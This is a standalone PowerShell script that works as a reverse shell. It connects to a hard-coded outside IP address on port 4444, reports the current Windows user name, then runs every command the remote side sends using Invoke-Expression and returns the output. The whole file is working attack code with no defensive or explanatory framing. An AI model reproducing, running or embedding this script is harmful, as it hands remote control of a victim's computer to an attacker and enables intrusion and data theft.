try {
    $client = New-Object System.Net.Sockets.TCPClient('162.19.135.187', 4444)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $reader = New-Object System.IO.StreamReader($stream)

    # Send current user name
    $writer.WriteLine([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)
    $writer.Flush()

    while ($true) {
        $command = $reader.ReadLine()

        if ($command -eq 'exit') {
            break
        }

        try {
            $output = Invoke-Expression $command 2>&1

            # Format output to avoid System.Object[]
            if ($output -is [System.Collections.IEnumerable] -and -not ($output -is [string])) {
                $output = $output -join "`n"  # Join array elements with a newline
            }
        } catch {
            $output = "Error executing command: $_"
        }

        $writer.WriteLine($output)
        $writer.Flush()
    }
} catch {
    Write-Host "An error occurred: $_"
} finally {
    if ($client) {
        $client.Close()
    }
}
